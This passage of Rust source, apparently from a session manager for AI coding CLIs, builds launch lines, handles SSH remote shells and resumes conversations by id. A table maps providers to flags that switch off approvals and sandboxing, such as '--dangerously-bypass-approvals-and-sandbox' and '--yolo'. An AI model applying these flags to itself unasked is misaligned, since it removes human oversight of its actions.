                return Err(format!("Remote folder not found: {async_cwd}"));
            }
            crate::commands::remote::open_shell_on(&handle, &async_cwd, cols, rows).await
        }
        .await;
        let _ = tx.send(result);
    });
    let shell = rx
        .recv_timeout(Duration::from_secs(60))
        .map_err(|_| "Remote session setup timed out".to_string())??;

    let writer: Arc<Mutex<Box<dyn Write + Send>>> = Arc::new(Mutex::new(Box::new(RemoteWriter {
        ctl: shell.ctl.clone(),
    })));
    let killer: Mutex<Box<dyn ChildKiller + Send + Sync>> = Mutex::new(Box::new(RemoteKiller {
        ctl: shell.ctl.clone(),
    }));
    let buffer = Arc::new(Mutex::new(OutputBuffer::new(cols, rows)));
    let last_output_ms = Arc::new(std::sync::atomic::AtomicU64::new(epoch_ms()));
    let pump_state = Arc::new(crate::commands::terminal::PumpState::default());

    // Same DECRST preamble as local: the terminal view is reused across
    // spawns and a dead TUI may have left the input-reporting modes on.
    buffer.lock().push(MODE_RESET_PREAMBLE);
    pump_state.push(MODE_RESET_PREAMBLE);

    // Reader: drains SSH channel messages into the replay buffer + coalesced
    // pump + output tap — same as the local reader thread.
    let pump_session_id = session_id.to_string();
    let pump_buffer = buffer.clone();
    let pump_last_output = last_output_ms.clone();
    let manager_for_exit = Arc::clone(manager);
    let exit_session_id = session_id.to_string();
    let exit_app = app.clone();
    let rd_state = pump_state.clone();
    let mut output_rx = shell.output_rx;
    std::thread::spawn(move || {
        let exit_code: Option<u32> = loop {
            match output_rx.blocking_recv() {
                Some(crate::commands::remote::RemoteShellMsg::Data(chunk)) => {
                    pump_buffer.lock().push(&chunk);
                    pump_last_output.store(epoch_ms(), std::sync::atomic::Ordering::Relaxed);
                    let _ = rd_state.push(&chunk);
                    let tap = manager_for_exit.output_tap.lock().clone();
                    if let Some(tap) = tap {
                        tap(&pump_session_id, &chunk);
                    }
                }
                Some(crate::commands::remote::RemoteShellMsg::Exit(code)) => break code,
                None => break None,
            }
        };
        rd_state.mark_eof();
        // Same choreography as the local reader: voluntary park (standby) and
        // closed lead do nothing; a dropped channel (network drop or remote
        // provider exit) converges into exited→standby, so the cover
        // offers "Resume session" instead of a dead terminal — and wake
        // reconnects from the pool with resume.
        if crate::commands::agents::is_lead_closed(&manager_for_exit, &exit_session_id) {
            return;
        }
        let convert_to_standby = manager_for_exit.note_pty_exit(
            &exit_session_id,
            &pump_buffer,
            Some(serde_json::json!({
                "exitCode": exit_code,
                "remote": true,
                "reason": "ssh channel closed",
            })),
        );
        if convert_to_standby {
            eprintln!(
                "[SessionManager] remote SSH channel closed (network drop o exit provider) — park: {exit_session_id}"
            );
            let _ = manager_for_exit.standby(&exit_app, &exit_session_id);
        }
    });

    // Flusher: identical to local (term_host: absolute offset, replaceable channel, copy to children).
    crate::commands::term_host::spawn_session_flusher(session_id, pump_state, on_output);

    // Register the remote PTY on the session (refused, and the channel
    // closed, when the session was closed or parked meanwhile).
    manager.register_pty(
        session_id,
        SessionPty {
            backing: PtyBacking::Remote(shell.ctl.clone()),
            writer,
            buffer: buffer.clone(),
            last_output_ms,
            killer,
        },
    )?;

    // Shared launch injection, without a forced --session-id (see
    // schedule_launch_injection: the feature check is on the local binary).
    schedule_launch_injection(manager, session_id, provider, config, false);

    Ok(())
}

/// build_launch_command — builds the provider CLI's launch line.
/// Partial adapter.spawn logic: for claude-code-cli
/// it handles command/args/resume/--continue. generic-shell launches nothing.
///
/// TODO: the other adapters (codex, gemini-cli, antigravity, copilot,
/// cursor, grok, hermes, opencode, promptops-cli) each have their own
/// command builder + native auto-approve flags + hook/MCP materialization.
/// Only the shared skeleton lives here; the specific adapters belong
/// in the providers module (outside the scope of this file).
/// Native auto-approve flag per provider. claude-code-cli/zai/kimi have no flag: AA goes through
/// hooks + tailer on the claude CLI.
pub(crate) fn native_auto_approve_flag(provider: &str) -> Option<&'static str> {
    match provider {
        "codex" => Some("--dangerously-bypass-approvals-and-sandbox"),
        // gemini ≥ 0.50 deprecates `-y/--yolo` in favor of --approval-mode.
        "gemini-cli" => Some("--approval-mode yolo"),
        // muse `--yolo` = no approvals AND no sandbox (like codex
        // --dangerously-bypass-approvals-and-sandbox) + trusted workspace.
        "hermes" | "muse" => Some("--yolo"),
        "antigravity" => Some("--dangerously-skip-permissions"),
        "copilot" => Some("--allow-all-tools"),
        "grok" => Some("--always-approve"),
        "cursor" => Some("--force"),
        "promptops-cli" => Some("--yes"),
        _ => None,
    }
}

/// Flag the provider's CLI uses to accept the model at launch. None =
/// the CLI has no command-line model selection (the model stays
/// its default/account one). Checked against each CLI's `--help`
/// (October 2026): grok `-m, --model <MODEL>`, copilot `--model <model>`,
/// opencode `-m, --model` (`provider/model`), hermes `-m MODEL`.
pub(crate) fn model_flag(provider: &str) -> Option<&'static str> {
    match provider_resume_family(provider) {
        "claude-code-cli" | "antigravity" | "muse" | "promptops-cli" | "copilot" => Some("--model"),
        "codex" | "gemini-cli" | "grok" | "opencode" | "hermes" => Some("-m"),
        _ => None,
    }
}

/// Codex (≥ 0.100, default `tui.alternate_screen = auto`) opens the TUI
/// in the ALTERNATE SCREEN: in xterm.js the alt buffer has no scrollback, so
/// everything that leaves the viewport is unreachable — no scrollbar, no
/// scrolling up, "stuck chat" (user reports 28-30/09/2026).
/// `--no-alt-screen` brings the TUI back to inline mode, with history in the
/// terminal's normal scrollback like Claude Code. It is a global option:
/// it goes BEFORE the `resume` subcommand.
///
/// Kill switch: `PROMPTOPS_CODEX_ALT_SCREEN=1` keeps Codex's default.
pub(crate) fn codex_no_alt_screen_flag() -> &'static str {
    let keep_alt = matches!(
        std::env::var("PROMPTOPS_CODEX_ALT_SCREEN").as_deref(),
        Ok("1") | Ok("true")
    );
    // Under test no probe of the real CLI: the expected launch lines
    // stay deterministic.
    let supported = !cfg!(test) && codex_supports_no_alt_screen();
    codex_no_alt_screen_flag_for(supported, keep_alt)
}

/// Pure (testable) decision of [`codex_no_alt_screen_flag`].
pub(crate) fn codex_no_alt_screen_flag_for(supported: bool, keep_alt: bool) -> &'static str {
    if supported && !keep_alt {
        "--no-alt-screen"
    } else {
        ""
    }
}

/// `--no-alt-screen` exists since Codex 0.100: on an older CLI it would be an
/// unknown flag and Codex would not start. Probe ONCE per run, same
/// scheme as `claude_supports_session_id`; when in doubt, NO.
pub(crate) fn codex_supports_no_alt_screen() -> bool {
    static SUPPORTED: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    *SUPPORTED.get_or_init(|| cli_help_mentions("codex", "--no-alt-screen"))
}

/// `true` if `<cli> --help` (in the user's PATH) contains `needle`. Used to
/// find out whether a CLI accepts a flag before putting it in the launch line: an
/// unknown flag = a CLI that doesn't start. Probe in a login shell; ONLY on Linux
/// a second attempt with the user's login+interactive shell (`sh -l` is
/// dash and reads only ~/.profile: a CLI on PATH from ~/.bashrc is not seen).
/// When in doubt, `false`.
pub(crate) fn cli_help_mentions(cli: &str, needle: &str) -> bool {
    let probe = format!("{cli} --help 2>/dev/null");
    let via_sh = crate::commands::util_cmd::cmd("sh")
        .arg("-lc")
        .arg(&probe)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).contains(needle))
        .unwrap_or(false);
    if via_sh || !cfg!(target_os = "linux") {
        return via_sh;
    }
    let shell = login_shell();
    let mut c = crate::commands::util_cmd::cmd(shell);
    for arg in login_args() {
        c.arg(arg);
    }
    c.arg("-c")
        .arg(&probe)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).contains(needle))
        .unwrap_or(false)
}

/// Kill switch: `PROMPTOPS_LEGACY_RESUME=1` turns off the multi-provider map and
/// the stored-record reconciliation, bringing resume back EXACTLY to the
/// previous behavior (only `providerOptions.resume` + `claudeSessionId`).
/// Safety net in case the new path misbehaves in the
/// field: recoverable without downgrading the app.
pub(crate) fn legacy_resume_mode() -> bool {
    static CACHE: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    *CACHE.get_or_init(|| {
        matches!(
            std::env::var("PROMPTOPS_LEGACY_RESUME").as_deref(),
            Ok("1") | Ok("true")
        )
    })
}

/// Provider's resume family: providers sharing the same CLI also share
/// the conversation history, hence the same key in the map.
/// zai/kimi spawn the `claude` binary (compatible endpoint via env): their
/// ids live in the same JSONL files as claude-code-cli.
pub(crate) fn provider_resume_family(provider: &str) -> &str {
    match provider {
        "zai" | "kimi" => "claude-code-cli",
        other => other,
    }
}

/// Can the provider resume a SPECIFIC conversation given its id?
/// Distinct from "has any resume": gemini (`--resume latest`) and
/// antigravity (`--continue`) resume only the last one, without an id.
pub(crate) fn provider_resumes_by_id(provider: &str) -> bool {
    resume_by_id_flag(provider_resume_family(provider), "x").is_some()
}

/// How by-id resume is written for each CLI. `None` = the CLI cannot
/// reopen a SPECIFIC conversation given its id.
///
/// Verified on the installed CLIs (June 2026) — gemini is left out on purpose:
/// its `--resume` accepts only `latest` or a positional INDEX, which changes
/// with every new session, so it stays on `--resume latest`.
pub(crate) fn resume_by_id_flag(family: &str, id: &str) -> Option<String> {
    match family {
        "claude-code-cli" => Some(format!("--resume {id}")),
        // codex: `resume` is a SUBCOMMAND and global options must precede it.
        "codex" => Some(format!("resume {id}")),
        "grok" => Some(format!("--resume {id}")),
        "opencode" => Some(format!("--session {id}")),
        "hermes" => Some(format!("--resume {id}")),
        // antigravity: `--conversation <id>` (conversation_id from the JSON/hook).
        "antigravity" => Some(format!("--conversation {id}")),
        // muse: `resume` is a SUBCOMMAND (`muse resume <id>`), like codex.
        "muse" => Some(format!("resume {id}")),
        _ => None,
    }
}

/// The ids CLIs accept are uuids/slugs: anything else never ends up
/// in a shell line. No interpolation of arbitrary strings.
pub(crate) fn is_safe_session_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= 128
        && id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | ':' | '-'))
}

/// Resume fragment for the launch line, id included when the CLI
/// supports it. Empty string = no resume.
pub(crate) fn resume_fragment(provider: &str, session_id: Option<&str>) -> String {
    let family = provider_resume_family(provider);
    if let Some(id) = session_id.filter(|id| is_safe_session_id(id)) {
        if let Some(flag) = resume_by_id_flag(family, id) {
            return flag;
        }
    }
    // Without an id: providers that can resume "the last one" in the cwd do so.
    match family {
        "claude-code-cli" | "antigravity" | "copilot" | "grok" | "opencode" => "--continue".into(),
        "gemini-cli" => "--resume latest".into(),
        "codex" | "muse" => "resume --last".into(),
        _ => String::new(),
    }
}

/// Effective cwd of a session: `config.cwd`, otherwise the workspace
/// path (sessions restored from the local store may have only that).
fn session_cwd(session: &AgentSession) -> Option<String> {
    session
        .config
        .cwd
        .clone()
        .or_else(|| session.workspace.as_ref().map(|w| w.path.clone()))
}

/// cwd comparison tolerant of a trailing slash (`/a/b/` ≡ `/a/b`).
fn normalize_cwd(path: &str) -> &str {
    let trimmed = path.trim();
    let stripped = trimmed.trim_end_matches(['/', '\\']);
    if stripped.is_empty() {
        trimmed
    } else {
        stripped
    }
}

/// Gate of the "shared cwd" guard on the `--continue` fallback: on
/// ONLY on Linux, where the bug was observed (Ubuntu). On macOS/Windows
/// the guard applies to the families that resume by id (claude, codex):
/// see `resume_siblings_guard_for`.
pub(crate) const RESUME_SIBLINGS_GUARD: bool = cfg!(target_os = "linux");

/// Per-family guard: claude and codex everywhere (UX audit 10/2026 on macOS:
/// waking "Claude 3" showed "Claude 2"'s conversation); the
/// other families keep the historical Linux gate, because gemini/antigravity
/// resume only "the last one" and without a fallback would always start clean.
pub(crate) fn resume_siblings_guard_for(provider: &str) -> bool {
    RESUME_SIBLINGS_GUARD
        || matches!(
            provider_resume_family(provider),
            "codex" | "claude-code-cli"
        )
}

/// Launch plan when resume is in play: `(allow_continue, fresh_sid_ok)`.
/// - `allow_continue`: the builder may fall back to `--continue` without an id;
/// - `fresh_sid_ok`: a fresh `--session-id` can be forced (only without an id).
/// With the gate off (`guard=false`) it is EXACTLY the historical behavior:
/// `--continue` always allowed, fresh id whenever the sid is missing.
pub(crate) fn resume_launch_plan(
    guard: bool,
    resume_requested: bool,
    has_sid: bool,
    has_siblings: bool,
) -> (bool, bool) {
    if has_sid {
        return (true, false); // resuming by id: no fresh, no continue
    }
    if !guard {
        return (true, true);
    }
    let ambiguous = resume_requested && has_siblings;
    let allow_continue = !ambiguous;
    // `--continue` will really end up in the line: the reopened conversation already has
    // its id (delivered by the SessionStart hook) → no fresh id.
    let will_continue = resume_requested && allow_continue;
    (allow_continue, !will_continue)
}

/// True if among `sessions` (id, provider, cwd) there is ANOTHER session with the
/// same cwd and the same resume family as `provider`. Pure: the
/// version with state is `SessionManager::cwd_has_resume_siblings`.
pub(crate) fn has_resume_siblings<'a>(
    sessions: impl Iterator<Item = (&'a str, &'a str, Option<String>)>,
    session_id: &str,
    provider: &str,
    cwd: Option<&str>,
) -> bool {
    let Some(cwd) = cwd.map(normalize_cwd).filter(|c| !c.is_empty()) else {
        return false;
    };
    let family = provider_resume_family(provider);
    sessions.into_iter().any(|(id, other_provider, other_cwd)| {
        id != session_id
            && provider_resume_family(other_provider) == family
            && other_cwd.as_deref().map(normalize_cwd) == Some(cwd)
    })
}

/// Per-device key inside the map: `<family>@<deviceId>`.
///
/// The transcript that resume reopens is a LOCAL FILE
/// (`~/.claude/projects/<hash-cwd>/<sid>.jsonl`, codex rollouts under
/// `CODEX_HOME`): it is not in the local store and does not travel between computers. An id
/// captured on another PC has no file behind it here, and passing it to
/// `--resume` makes the CLI exit with an error — worse than an empty terminal.
/// That is why the id is tagged with the device that produced it.
pub(crate) fn device_scoped_key(family: &str, device_id: &str) -> String {
    format!("{family}@{device_id}")
}

/// Conversation id to resume for `provider` on this session, in decreasing
/// order of freshness:
///   1. `config.providerSessionIds[family@device]` — the id captured on THIS
///      device, the only one whose transcript is guaranteed to be local;
///   2. `config.providerSessionIds[family]` — the bare key, discarded if it
///      provably belongs to another device;
///   3. `claude_session_id` column — valid only if the session is STILL on
///      the provider that wrote it;
///   4. `providerOptions.claudeSessionId` — legacy format from old builds.
/// `device_id = None` disables the per-device filter (legacy behavior).
pub(crate) fn resolve_provider_session_id_for_device(
    provider: &str,
    config: &SessionConfig,
    session_provider: &str,
    session_claude_session_id: Option<&str>,
    device_id: Option<&str>,
) -> Option<String> {
    let family = provider_resume_family(provider);

    // 1. The id captured ON THIS device: the only one certain to have its
    //    transcript locally.
    if !legacy_resume_mode() {
        if let Some(dev) = device_id.filter(|d| !d.is_empty()) {
            if let Some(sid) = config
                .provider_session_ids
                .as_ref()
                .and_then(|m| m.get(device_scoped_key(family, dev)))
                .and_then(|v| v.as_str())
                .filter(|s| !s.is_empty())
            {
                return Some(sid.to_string());
            }
            // 2. The "bare" id belongs to another device — either because there is
            //    no ambiguous one, or because it matches the one another
            //    device marked as its own. That transcript does not exist here:
            //    attempting the resume would make the CLI exit with an error on a
            //    bare shell.
            let prefix = format!("{family}@");
            let other_device_ids: Vec<String> = config
                .provider_session_ids
                .as_ref()
                .and_then(|m| m.as_object())
                .map(|obj| {
                    obj.iter()
                        .filter(|(k, _)| k.starts_with(&prefix))
                        .filter_map(|(_, v)| v.as_str().filter(|s| !s.is_empty()))
                        .map(str::to_string)
                        .collect()
                })
                .unwrap_or_default();
            let unscoped = config
                .provider_session_ids
                .as_ref()
                .and_then(|m| m.get(family))
                .and_then(|v| v.as_str())
                .filter(|s| !s.is_empty());
            if !other_device_ids.is_empty()
                && unscoped.is_none_or(|u| other_device_ids.iter().any(|o| o == u))
            {
                return None;
            }
        }
    }

    if legacy_resume_mode() {
        // Full fallback to the previous behavior: only the legacy bag.
        return config
            .provider_options
            .as_ref()
            .and_then(|o| o.get("claudeSessionId"))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(str::to_string);
    }
    if let Some(sid) = config
        .provider_session_ids
        .as_ref()
        .and_then(|m| m.get(family))
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
    {
        return Some(sid.to_string());
    }
    if provider_resume_family(session_provider) == family {
        if let Some(sid) = session_claude_session_id.filter(|s| !s.is_empty()) {
            return Some(sid.to_string());
        }
    }
    config
        .provider_options
        .as_ref()
        .and_then(|o| o.get("claudeSessionId"))
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .map(str::to_string)
}

/// record_provider_session_id — records the id in the map in `config`, without
/// touching the other keys. Returns the updated map only if it changed
/// (so the caller avoids useless store updates).
pub(crate) fn record_provider_session_id(
    config: &mut SessionConfig,
    provider: &str,
    session_id: &str,
    device_id: Option<&str>,
) -> Option<JsonValue> {
    if legacy_resume_mode() {
        return None; // kill switch: no writes to the map
    }
    let family = provider_resume_family(provider);
    let map = config
        .provider_session_ids
        .get_or_insert_with(|| serde_json::json!({}));
    if !map.is_object() {
        *map = serde_json::json!({});
    }
    let obj = map.as_object_mut()?;
    // TWO keys are written: the per-device one (the only one truly resumable,
    // because the transcript is local) and the bare one, which stays the value read
    // by builds that don't know about per-device scoping.
    let scoped = device_id
        .filter(|d| !d.is_empty())
        .map(|d| device_scoped_key(family, d));
    let unchanged = obj.get(family).and_then(|v| v.as_str()) == Some(session_id)
        && scoped
            .as_ref()
            .is_none_or(|k| obj.get(k).and_then(|v| v.as_str()) == Some(session_id));
    if unchanged {
        return None;
    }
    obj.insert(family.to_string(), serde_json::json!(session_id));
    if let Some(key) = scoped {
        obj.insert(key, serde_json::json!(session_id));
    }
    Some(map.clone())
}

/// Resume id actually used at spawn, kill switch included.
pub(crate) fn resolve_resume_sid_for_launch(
    provider: &str,
    config: &SessionConfig,
    session_provider: &str,
    session_claude_session_id: Option<&str>,
    device_id: Option<&str>,
) -> Option<String> {
    let mut resume_sid = resolve_provider_session_id_for_device(
        provider,
        config,
        session_provider,
        session_claude_session_id,
        device_id,
    );
    if legacy_resume_mode() {
        // Previous behavior: the id counts only if the flag asks for it.
        let requested = config
            .provider_options
            .as_ref()
            .and_then(|o| o.get("resume"))
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        if !requested {
            resume_sid = None;
        }
    }
    resume_sid
}

/// Patterns with which CLIs report an unrecoverable conversation id.
/// Deliberately narrow: a false positive would relaunch the CLI, losing the
/// context of a healthy session.
/// What rejected the resume. The two cases want DIFFERENT recoveries:
/// with an id without a local transcript the CLI started and has just declared
/// that id free (→ the conversation can be recreated with the same
/// identity); with a corrupted launch line the CLI never started and the
/// transcript may exist (→ a `--session-id` would fail with "already in use").
pub(crate) enum ResumeFailureKind {
    IdNotFound,
    LaunchGarbled,
}

pub(crate) fn resume_failure_kind(output: &str) -> Option<ResumeFailureKind> {
    // Comparison WITHOUT spaces: the claude CLI draws spaces with cursor-forward
    // (`ESC[1C`), which strip_ansi removes ("Noconversationfound…"), and a narrow
    // terminal breaks the line. Seen in the field after standby: error on screen,
    // needle never found, no relaunch.
    let lower: String = output
        .to_lowercase()
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect();
    let has = |needle: &&str| lower.contains(&needle.replace(' ', ""));
    if [
        "no conversation found with session id",
        "no conversation found",
        "session id not found",
        "no session found",
        "session not found",
        "no rollout found",
        "could not find session",
    ]
    .iter()
    .any(has)
    {
        return Some(ResumeFailureKind::IdNotFound);
    }
    // Launch line corrupted by spurious input (leftover mouse reports):
    // the shell answers "command not found" and without this needle the
    // session would stay on a bare shell. Safe because the watcher is
    // armed ONLY in the seconds right after our resume injection:
    // if the TUI started there is no shell that could print it.
    if ["command not found", "is not recognized as"]
        .iter()
        .any(has)
    {
        return Some(ResumeFailureKind::LaunchGarbled);
    }
    None
}

/// Window in which an "id not found" can still be attributed to our
/// resume: the CLI must start first (node, version check, reading the
/// transcript) and on a cold boot with several sessions it can take tens of seconds.
pub(crate) const NOT_FOUND_WINDOW_MS: u128 = 40_000;
/// Window for the corrupted launch line: the shell answers instantly;
/// past this, a "command not found" comes from the user in the TUI.
pub(crate) const GARBLED_WINDOW_MS: u128 = 12_000;

/// True if the failure detected `elapsed_ms` after the injection must still be
/// treated as the outcome of OUR resume (and not as user output).
pub(crate) fn resume_failure_in_window(kind: &ResumeFailureKind, elapsed_ms: u128) -> bool {
    match kind {
        ResumeFailureKind::IdNotFound => elapsed_ms < NOT_FOUND_WINDOW_MS,
        ResumeFailureKind::LaunchGarbled => elapsed_ms < GARBLED_WINDOW_MS,
    }
}

/// Relaunch plans when the resume is rejected by the CLI.
struct ResumeRecovery {
    /// The id the resume tried (and failed) to reopen.
    sid: String,
    /// Relaunch that PRESERVES the identity (`--session-id <sid>`): the conversation
    /// is reborn with the same id — reopenable by future resumes and consistent with
    /// the stored session record. Claude family only, IdNotFound only.
    keep_id: Option<String>,
    /// Clean relaunch without resume, like the historical behavior.
    plain: Option<String>,
}

/// recover_failed_resume — if the resume fails, relaunches the CLI clean.
///
/// Covers the copied-session case: the transcript lives locally
/// (`~/.claude/projects/…`, codex rollouts), so an id captured on another
/// PC has no file behind it and the CLI exits right away with an error, leaving the
/// bare shell. Also covers the same device with a cleaned-up history.
/// A single attempt, short window: if nothing happens within a few seconds the
/// CLI really started.
/// `from_total`: baseline already taken at injection (LAUNCH_CONFIRM watchdog
/// ran first); None = baseline taken here, historical behavior.
fn recover_failed_resume(
    manager: &Arc<SessionManager>,
    session_id: &str,
    recovery: &ResumeRecovery,
    from_total: Option<usize>,
) {
    // Two windows: the shell answers RIGHT AWAY to a corrupted line, while
    // "conversation not found" arrives only after the CLI boots — which on a
    // cold start (many sessions restarting together, cold node) easily
    // exceeds 12s: seen in the field, error on screen and no
    // relaunch. Past GARBLED_WINDOW_MS a "command not found" is the user's.
    const WINDOW_MS: u128 = NOT_FOUND_WINDOW_MS;
    const POLL_MS: u64 = 150;

    // Only the buffer TAIL is checked: the resume error arrives right after
    // the launch, and copying the whole buffer 80 times (12s / 150ms) on a
    // session with lots of output would be tens of MB of allocations under the
    // state lock.
    const TAIL_BYTES: usize = 8 * 1024;

    // Baseline: ONLY output that arrived AFTER the launch injection is evaluated.
    // Without it, a shell profile that prints "command not found" (e.g. a tool
    // missing in .zshrc) would trigger the fallback on a healthy session,
    // typing it inside the TUI that just started.
    let baseline_total = {
        let guard = manager.state.lock();
        match guard.sessions.get(session_id).and_then(|s| s.pty.as_ref()) {
            Some(pty) => from_total.unwrap_or_else(|| pty.buffer.lock().total),
            None => return,
        }
    };

    let start = Instant::now();
    while start.elapsed().as_millis() < WINDOW_MS {
        std::thread::sleep(std::time::Duration::from_millis(POLL_MS));
        let tail = {
            // Only the buffer's tail is cloned, and the state lock is
            // released right after.
            let guard = manager.state.lock();
            match guard.sessions.get(session_id).and_then(|s| s.pty.as_ref()) {
                Some(pty) => {
                    let data = pty.buffer.lock();
                    let fresh = data.total.saturating_sub(baseline_total).min(TAIL_BYTES);
                    let from = data.data.len().saturating_sub(fresh);
                    data.data[from..].to_vec()
                }
                None => return, // PTY gone: session closed or on standby
            }
        };
        if tail.is_empty() {
            continue; // no new output since the injection
        }
        let buf = String::from_utf8_lossy(&tail);
        let kind = match resume_failure_kind(&strip_ansi(&buf)) {
            Some(kind) => kind,
            None => continue,
        };
        if !resume_failure_in_window(&kind, start.elapsed().as_millis()) {
            continue;
        }
        // Plain message + relaunch command. Bare `echo`, without
        // quotes/`&&`/parentheses/`[]` (brackets glob in zsh, `&&` does not work on
        // PowerShell 5): it must work identically on zsh/bash/PowerShell/cmd.
        let (notice, cmd) = match kind {
            ResumeFailureKind::IdNotFound => match (&recovery.keep_id, &recovery.plain) {
                (Some(keep), _) => (
                    Some(format!(
                        "echo PromptOps: conversation {} not found on this device - recreating it with the same ID\r",
                        recovery.sid
                    )),
                    keep.clone(),
                ),
                (None, Some(plain)) => (
                    Some(format!(
                        "echo PromptOps: conversation {} not found on this device - opening a new one\r",
                        recovery.sid
                    )),
                    plain.clone(),
                ),
                (None, None) => return,
            },
            // CLI never started: clean and silent relaunch (historical behavior).
            ResumeFailureKind::LaunchGarbled => match &recovery.plain {
                Some(plain) => (None, plain.clone()),
                None => return,
            },
        };
        let keeps_id = matches!(kind, ResumeFailureKind::IdNotFound) && recovery.keep_id.is_some();
        let writer = {
            let guard = manager.state.lock();
            guard
                .sessions
                .get(session_id)
                .and_then(|s| s.pty.as_ref())
                .map(|p| p.writer.clone())
        };
        if let Some(w) = writer {
            let mut w = w.lock();
            if let Some(notice) = notice {
                let _ = w.write_all(notice.as_bytes());
            }
            let _ = w.write_all(cmd.as_bytes());
            drop(w);
            if keeps_id {
                // Identity preserved: state/column stay on that id, future
                // resumes find it again.
                manager.set_claude_session_id(session_id, &recovery.sid);
                eprintln!(
                    "[SessionManager] resume rejected (transcript missing on this device) — recreating the conversation with the same id: {session_id}"
                );
            } else {
                eprintln!(
                    "[SessionManager] resume rejected by the provider (transcript missing on this device) — clean relaunch: {session_id}"
                );
            }
        }
        return;
    }
}

/// Can the CLI of this session start the local `promptops` MCP server? Not
/// on a remote host (the app is not reachable from there) and not inside a
/// WSL distro: the --mcp-config path and the node entry in it are Windows
/// paths the distro cannot open.
fn mcp_reachable_from(config: &SessionConfig) -> bool {
    config.remote_command.is_none()
        && !crate::commands::remote::is_remote_path(config.cwd.as_deref())
        && crate::commands::windows_shells::wsl_distro_of(
            crate::commands::windows_shells::effective_shell_for(
                config.shell.as_deref(),
                config.cwd.as_deref(),
            )
            .as_deref(),
        )
        .is_none()
}

fn build_launch_command_inner(
    provider: &str,
    config: &SessionConfig,
    resume_sid: Option<&str>,
    allow_continue: bool,
    // Id to FORCE on the CLI when nothing is resumed (None = do not force it).
    fresh_sid: Option<&str>,
    // PromptOps session that registers the `promptops` MCP server in the CLI
    // (None = no registration, e.g. tests). Never for remote sessions: the app
    // is not reachable from the remote host.
    mcp_session: Option<&str>,
) -> Option<String> {
    // Ids end up in a shell line: anything that is not a plain id is dropped
    // (a forged hook could otherwise inject a command).
    let resume_sid = resume_sid.filter(|id| is_safe_session_id(id));
    let fresh_sid = fresh_sid.filter(|id| is_safe_session_id(id));
    let mcp = |family: &str| {
        mcp_session
            .filter(|_| mcp_reachable_from(config))
            .and_then(|sid| crate::commands::promptops_cli::mcp_launch_fragment(family, sid))
            .unwrap_or_default()
    };
    let alias = if config.remote_command.is_none()
        && !crate::commands::remote::is_remote_path(config.cwd.as_deref())
    {
        crate::commands::provider_account::resolve_account_command(
            provider,
            config.provider_account_id.clone(),
        )
    } else {
        None
    };
    let launch = match provider {
        "generic-shell" => None, // no launch: plain shell.
        // zai/kimi spawn the claude CLI (compatible endpoint via env):
        // same builder, same resume (--resume <sid> / --continue).
        "claude-code-cli" | "zai" | "kimi" => {
            let opts = config.provider_options.as_ref();
            let command = opts
                .and_then(|o| o.get("command"))
                .and_then(|v| v.as_str())
                .unwrap_or("claude")
                .to_string();
            let args = opts
                .and_then(|o| o.get("args"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let resume_requested = opts
                .and_then(|o| o.get("resume"))
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let mut resume_flag = String::new();
            if let Some(sid) = resume_sid {
                resume_flag = format!("--resume {sid}");
            } else if resume_requested && allow_continue {
                // No id: `--continue` resumes the cwd's most recent conversation
                // — it may belong to another session, but it is still better
                // than an empty terminal and it is the historical behavior.
                resume_flag = "--continue".into();
            }
            // No resume in play: then we decide the conversation id
            // ourselves, so we know where the CLI will write the transcript.
            if resume_flag.is_empty() {
                if let Some(fresh) = fresh_sid.filter(|s| is_safe_session_id(s)) {
                    resume_flag = format!("--session-id {fresh}");
                }
            }
            let mcp = mcp("claude-code-cli");
            // Hooks per process (`--settings`): local sessions only, like the MCP.
            let settings = mcp_session
                .filter(|_| {
                    config.remote_command.is_none()
                        && !crate::commands::remote::is_remote_path(config.cwd.as_deref())
                })
                .and_then(|_| claude_settings_fragment(provider))
                .unwrap_or_default();
            let full_args: Vec<&str> = [
                args.as_str(),
                resume_flag.as_str(),
                mcp.as_str(),
                settings.as_str(),
            ]
            .into_iter()
            .filter(|s| !s.is_empty())
            .collect();
            Some(format!("{} {}\r", command, full_args.join(" ")))
        }
        // codex: resume is a SUBCOMMAND (`codex resume <sid|--last>`), not a
        // flag, and global options (AA) must PRECEDE it (see
        // buildCodexLaunchCommand).
        "codex" => {
            let opts = config.provider_options.as_ref();
            let command = opts
                .and_then(|o| o.get("command"))
                .and_then(|v| v.as_str())
                .unwrap_or("codex");
            let args = opts
                .and_then(|o| o.get("args"))
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let is_resume = resume_sid.is_some()
                || (allow_continue
                    && opts
                        .and_then(|o| o.get("resume"))
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false));
            let sid = resume_sid;
            let aa = if config.auto_approve == Some(true) {
                native_auto_approve_flag("codex").unwrap_or("")
            } else {
                ""
            };
            let mcp = mcp("codex");
            let no_alt = codex_no_alt_screen_flag();
            let mut parts: Vec<&str> = vec![command];
            // Inline mode (history in xterm's scrollback): global option,
            // before everything else.
            if !no_alt.is_empty() {
                parts.push(no_alt);
            }
            if !aa.is_empty() {
                parts.push(aa);
            }
            // Global options (-c …) must precede the `resume` subcommand.
            if !mcp.is_empty() {
                parts.push(mcp.as_str());
            }
            if is_resume {
                parts.push("resume");
                parts.push(sid.unwrap_or("--last"));
            }
            if !args.is_empty() {
                parts.push(args);
            }
            Some(format!("{}\r", parts.join(" ")))
        }
        // Generic default: command/args from providerOptions or the provider's
        // binary + per-provider resume flag + native aaFlag.
        other => {
            let opts = config.provider_options.as_ref();
            let command = opts
                .and_then(|o| o.get("command"))
                .and_then(|v| v.as_str())
                .map(|s| s.to_string())
                .or_else(|| provider_command(other).map(|s| s.to_string()))?;
            let args = opts
                .and_then(|o| o.get("args"))
                .and_then(|v| v.as_str())
                .unwrap_or("");
            // grok/opencode/hermes resume by id (the id is captured by the post-spawn
            // probe); gemini and antigravity resume only "the last one".
